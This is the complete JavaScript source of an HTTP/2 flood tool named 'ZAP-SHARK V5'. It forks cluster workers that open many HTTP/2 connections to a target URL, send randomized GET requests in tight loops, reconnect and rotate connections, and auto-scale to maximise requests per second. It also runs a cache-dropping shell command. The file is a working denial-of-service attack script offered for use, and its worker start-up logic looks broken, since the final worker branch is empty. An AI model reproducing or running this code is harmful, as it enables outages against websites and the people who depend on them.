const http2 = require('http2');
const os = require('os');
const cluster = require('cluster');
const { exec } = require('child_process');

class ZAPSHARK_NODE {
    constructor(targetUrl, nodeId) {
        this.targetUrl = targetUrl;
        this.hostname = new URL(targetUrl).hostname;
        this.nodeId = nodeId;
        this.status = "ATTACKING";
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.nodeStartTime = Date.now();
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        
        // === NODE CONFIG ===
        this.connectionPool = [];
        this.connCount = 8; // PER NODE
        this.maxStreamsPerConn = 1000;
        
        // === ADVANCED THROTTLE ===
        this.cpuLimit = 0.899; // 89.9%
        this.adaptiveInterval = 50;
        this.performanceFactor = 1.0;
        
        // === MEMORY OPTIMIZATION ===
        this.connectionLifetime = {};
        this.requestQueue = [];
        this.batchSize = 25;
        
        // === NODE SPECIFIC ===
        this.nodeSignature = `ZAP-NODE-${nodeId}-${Date.now().toString(36)}`;
        
        this.setupNode();
    }

    setupNode() {
        // SET PROCESS PRIORITY
        if (os.platform() !== 'win32') {
            process.setPriority(5); // MID PRIORITY
        }
        
        // CREATE CONNECTION POOL
        this.createConnectionPool();
        
        // START NODE ENGINE
        this.startNodeEngine();
        
        console.log(`[NODE ${this.nodeId}] Online | CPU: ${os.cpus().length} cores`);
    }

    createConnectionPool() {
        for (let i = 0; i < this.connCount; i++) {
            setTimeout(() => {
                try {
                    const client = http2.connect(this.targetUrl, {
                        maxSessionMemory: 131072, // 128KB
                        maxDeflateDynamicTableSize: 2147483647,
                        peerMaxConcurrentStreams: 2000
                    });
                    
                    client.setMaxListeners(2000);
                    
                    // AGGRESSIVE SETTINGS
                    client.settings({
                        enablePush: false,
                        initialWindowSize: 33554432, // 32MB
                        maxConcurrentStreams: 2000
                    });
                    
                    client.on('error', () => {
                        // AUTO RECONNECT
                        setTimeout(() => this.createConnectionPool(), 100);
                    });
                    
                    this.connectionPool.push({
                        client,
                        id: `${this.nodeId}-${i}`,
                        created: Date.now(),
                        streams: 0
                    });
                    
                } catch (err) {}
            }, i * 10);
        }
    }

    // === ADAPTIVE THROTTLE ENGINE ===
    checkCPU() {
        const usage = process.cpuUsage();
        const totalUsage = (usage.user + usage.system) / 1000000;
        const cpuPercent = totalUsage / (os.cpus().length * 100);
        
        // ADAPTIVE THROTTLE
        if (cpuPercent > this.cpuLimit) {
            this.performanceFactor = Math.max(0.5, this.performanceFactor * 0.95);
            this.adaptiveInterval = Math.min(200, this.adaptiveInterval + 5);
        } else if (cpuPercent < this.cpuLimit * 0.8) {
            this.performanceFactor = Math.min(2.0, this.performanceFactor * 1.05);
            this.adaptiveInterval = Math.max(10, this.adaptiveInterval - 2);
        }
        
        return cpuPercent;
    }

    // === STREAM OPTIMIZED REQUEST ===
    sendOptimizedRequest() {
        if (this.connectionPool.length === 0) return;
        
        // BATCH PROCESSING
        const streamsThisBatch = Math.floor(this.batchSize * this.performanceFactor);
        
        for (let i = 0; i < streamsThisBatch; i++) {
            const conn = this.connectionPool[Math.floor(Math.random() * this.connectionPool.length)];
            if (!conn || conn.streams >= this.maxStreamsPerConn) continue;
            
            try {
                conn.streams++;
                
                const req = conn.client.request({
                    ':method': 'GET',
                    ':path': `/?node=${this.nodeId}&t=${Date.now()}&r=${Math.random()}`,
                    ':authority': this.hostname,
                    'user-agent': this.nodeSignature,
                    'x-zap-node': this.nodeId,
                    'x-request-id': `${Date.now()}-${Math.random().toString(36).substr(2, 9)}`
                });
                
                req.on('response', (headers) => {
                    // TRACK RESPONSE CODES PER NODE
                    const status = headers[':status'] || 0;
                    if (status >= 400) {
                        // ADAPTIVE BACKOFF
                        this.adaptiveInterval = Math.min(500, this.adaptiveInterval + 10);
                    }
                    req.destroy();
                });
                
                req.on('error', () => {
                    req.destroy();
                });
                
                req.on('close', () => {
                    conn.streams--;
                    this.totalRequests++;
                    this.requestsSinceLastCalc++;
                });
                
                req.end();
                
            } catch (err) {
                this.totalRequests++;
                this.requestsSinceLastCalc++;
            }
        }
    }

    // === CONNECTION HEALTH SYSTEM ===
    maintainConnections() {
        const now = Date.now();
        
        // AUTO PRUNE DEAD CONNECTIONS
        this.connectionPool = this.connectionPool.filter(conn => {
            if (conn.streams < 0 || (now - conn.created) > 30000 && conn.streams === 0) {
                try { conn.client.destroy(); } catch (err) {}
                return false;
            }
            return true;
        });
        
        // AUTO REFILL
        while (this.connectionPool.length < this.connCount) {
            this.createConnectionPool();
        }
        
        // ROTATE 20% EVERY 30s
        if (now % 30000 < 100) {
            const rotateCount = Math.ceil(this.connectionPool.length * 0.2);
            for (let i = 0; i < rotateCount; i++) {
                const idx = Math.floor(Math.random() * this.connectionPool.length);
                if (this.connectionPool[idx]) {
                    try {
                        this.connectionPool[idx].client.destroy();
                        this.createConnectionPool();
                    } catch (err) {}
                }
            }
        }
    }

    // === NODE ENGINE ===
    startNodeEngine() {
        // MAIN LOOP
        const nodeLoop = () => {
            // CPU THROTTLE
            this.checkCPU();
            
            // SEND REQUESTS
            this.sendOptimizedRequest();
            
            // MAINTAIN CONNECTIONS
            if (Date.now() % 5000 < 100) {
                this.maintainConnections();
            }
            
            // CALCULATE RPS
            const now = Date.now();
            const timeDiff = (now - this.lastRpsCalc) / 1000;
            if (timeDiff >= 0.9) {
                this.currentRPS = this.requestsSinceLastCalc / timeDiff;
                this.requestsSinceLastCalc = 0;
                this.lastRpsCalc = now;
            }
            
            // ADAPTIVE SCHEDULING
            setTimeout(nodeLoop, this.adaptiveInterval);
        };
        
        nodeLoop();
    }

    getStats() {
        return {
            nodeId: this.nodeId,
            requests: this.totalRequests,
            rps: this.currentRPS,
            connections: this.connectionPool.length,
            performance: this.performanceFactor,
            uptime: Date.now() - this.nodeStartTime
        };
    }
}

// === MASTER CLUSTER CONTROLLER ===
class ZAPSHARK_V5_MASTER {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.nodes = [];
        this.totalClusterRequests = 0;
        this.clusterRPS = 0;
        this.clusterStartTime = Date.now();
        this.masterStats = {
            peakRPS: 0,
            totalBytes: 0,
            nodesActive: 0,
            cpuUsage: 0
        };
        
        // === CLUSTER CONFIG ===
        this.nodeCount = Math.max(1, os.cpus().length - 1); // USE ALL CORES -1
        this.maxNodeCount = 16;
        this.scalingFactor = 1.5;
        
        // === CLUSTER CONTROL ===
        this.scalingInterval = null;
        this.statsInterval = null;
        
        console.log('=== ZAP-SHARK V5 CLUSTER MASTER ===');
        console.log(`Target: ${targetUrl}`);
        console.log(`Cores: ${os.cpus().length}`);
        console.log(`Nodes: ${this.nodeCount}`);
        console.log('='.repeat(50));
    }

    startCluster() {
        // FORK NODES
        for (let i = 0; i < this.nodeCount; i++) {
            this.forkNode(i);
        }
        
        // START CLUSTER MANAGEMENT
        this.startClusterManagement();
        
        // START STATS DISPLAY
        this.startStatsDisplay();
    }

    forkNode(nodeId) {
        if (cluster.isMaster) {
            const worker = cluster.fork({
                ZAP_NODE_ID: nodeId,
                ZAP_TARGET_URL: this.targetUrl
            });
            
            worker.on('message', (msg) => {
                if (msg.type === 'stats') {
                    this.nodes[nodeId] = msg.data;
                    this.updateClusterStats();
                }
            });
            
            console.log(`[MASTER] Node ${nodeId} forked (PID: ${worker.process.pid})`);
        } else {
            // WORKER PROCESS
            const node = new ZAPSHARK_NODE(
                process.env.ZAP_TARGET_URL,
                parseInt(process.env.ZAP_NODE_ID)
            );
            
            // SEND STATS TO MASTER EVERY SECOND
            setInterval(() => {
                if (process.send) {
                    process.send({
                        type: 'stats',
                        data: node.getStats()
                    });
                }
            }, 1000);
        }
    }

    // === ADAPTIVE SCALING ===
    autoScaleNodes() {
        const avgCPU = os.loadavg()[0] / os.cpus().length;
        
        // SCALE UP IF CPU UNDER UTILIZED
        if (avgCPU < 0.7 && this.nodeCount < this.maxNodeCount) {
            this.nodeCount = Math.min(this.maxNodeCount, Math.ceil(this.nodeCount * this.scalingFactor));
            for (let i = this.nodes.length; i < this.nodeCount; i++) {
                this.forkNode(i);
            }
            console.log(`[SCALE] ↑ Added nodes. Total: ${this.nodeCount}`);
        }
        
        // SCALE DOWN IF OVERLOADED
        if (avgCPU > 0.95 && this.nodeCount > 1) {
            const removeCount = Math.max(1, Math.floor(this.nodeCount * 0.3));
            this.nodeCount = Math.max(1, this.nodeCount - removeCount);
            
            // KILL EXCESS WORKERS
            const workers = Object.values(cluster.workers || {});
            for (let i = 0; i < removeCount && i < workers.length; i++) {
                workers[i].kill();
            }
            
            console.log(`[SCALE] ↓ Removed ${removeCount} nodes. Total: ${this.nodeCount}`);
        }
    }

    updateClusterStats() {
        let totalRequests = 0;
        let totalRPS = 0;
        let activeNodes = 0;
        
        for (const node of Object.values(this.nodes)) {
            if (node) {
                totalRequests += node.requests;
                totalRPS += node.rps;
                activeNodes++;
            }
        }
        
        this.totalClusterRequests = totalRequests;
        this.clusterRPS = totalRPS;
        this.masterStats.nodesActive = activeNodes;
        this.masterStats.peakRPS = Math.max(this.masterStats.peakRPS, totalRPS);
        this.masterStats.cpuUsage = os.loadavg()[0];
    }

    // === CLUSTER MANAGEMENT ===
    startClusterManagement() {
        // AUTO SCALING
        this.scalingInterval = setInterval(() => {
            this.autoScaleNodes();
        }, 10000);
        
        // NODE HEALTH CHECK
        setInterval(() => {
            for (const id in cluster.workers) {
                const worker = cluster.workers[id];
                if (worker && worker.isDead()) {
                    console.log(`[HEALTH] Node ${id} dead, respawning...`);
                    this.forkNode(parseInt(id));
                }
            }
        }, 5000);
        
        // MEMORY CLEANUP
        setInterval(() => {
            if (global.gc) global.gc();
            exec('sync && echo 3 > /proc/sys/vm/drop_caches 2>/dev/null || true');
        }, 30000);
    }

    // === ADVANCED DISPLAY ===
    startStatsDisplay() {
        this.statsInterval = setInterval(() => {
            const runtime = Date.now() - this.clusterStartTime;
            const hours = Math.floor(runtime / 3600000);
            const minutes = Math.floor((runtime % 3600000) / 60000);
            const seconds = Math.floor((runtime % 60000) / 1000);
            
            const reqsPerSec = this.totalClusterRequests / (runtime / 1000);
            
            process.stdout.write('\x1B[2J\x1B[0f');
            console.log('╔══════════════════════════════════════════════════════════╗');
            console.log('║                   ZAP-SHARK V5 CLUSTER                   ║');
            console.log('╠══════════════════════════════════════════════════════════╣');
            console.log(`║ RUNTIME: ${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')} │ NODES: ${this.masterStats.nodesActive}/${this.nodeCount} ║`);
            console.log('╠══════════════════════════════════════════════════════════╣');
            console.log(`║ TOTAL REQUESTS: ${this.totalClusterRequests.toLocaleString().padEnd(15)} ║`);
            console.log(`║ CURRENT RPS:    ${this.clusterRPS.toFixed(1).padEnd(8)} │ AVG RPS: ${reqsPerSec.toFixed(1).padEnd(8)} ║`);
            console.log(`║ PEAK RPS:       ${this.masterStats.peakRPS.toFixed(1).padEnd(8)} │ CPU: ${(this.masterStats.cpuUsage * 100).toFixed(1)}% ║`);
            console.log('╠══════════════════════════════════════════════════════════╣');
            
            // NODE DETAILS
            console.log('║ NODE STATS:                                            ║');
            for (let i = 0; i < this.masterStats.nodesActive; i++) {
                if (this.nodes[i]) {
                    console.log(`║   N${i}: ${this.nodes[i].requests.toLocaleString().padEnd(10)} reqs | ${this.nodes[i].rps.toFixed(1).padEnd(6)} rps | x${this.nodes[i].performanceFactor.toFixed(2)} ║`);
                }
            }
            
            console.log('╚══════════════════════════════════════════════════════════╝');
            console.log(`[CTRL+C to stop] | Target: ${this.targetUrl}`);
        }, 500);
    }

    // === SHUTDOWN ===
    shutdown() {
        console.log('\n\n╔══════════════════════════════════════════════════════════╗');
        console.log('║                    FINAL CLUSTER STATS                    ║');
        console.log('╠══════════════════════════════════════════════════════════╣');
        console.log(`║ Total Requests: ${this.totalClusterRequests.toLocaleString().padEnd(36)} ║`);
        console.log(`║ Peak RPS:       ${this.masterStats.peakRPS.toFixed(1).padEnd(36)} ║`);
        console.log(`║ Runtime:        ${((Date.now() - this.clusterStartTime) / 1000).toFixed(1)}s${' '.repeat(31)} ║`);
        console.log('╚══════════════════════════════════════════════════════════╝');
        
        clearInterval(this.scalingInterval);
        clearInterval(this.statsInterval);
        
        // KILL ALL WORKERS
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        
        process.exit(0);
    }
}

// === MAIN ENTRY ===
if (cluster.isMaster) {
    const target = process.argv[2];
    if (!target || !target.startsWith('https://')) {
        console.log('Usage: node zap-shark-v5.js https://target.com');
        process.exit(1);
    }
    
    const master = new ZAPSHARK_V5_MASTER(target);
    master.startCluster();
    
    // GRACEFUL SHUTDOWN
    process.on('SIGINT', () => master.shutdown());
    
} else {
    // WORKER PROCESS - DO NOTHING HERE, HANDLED IN ZAPSHARK_NODE
                        }
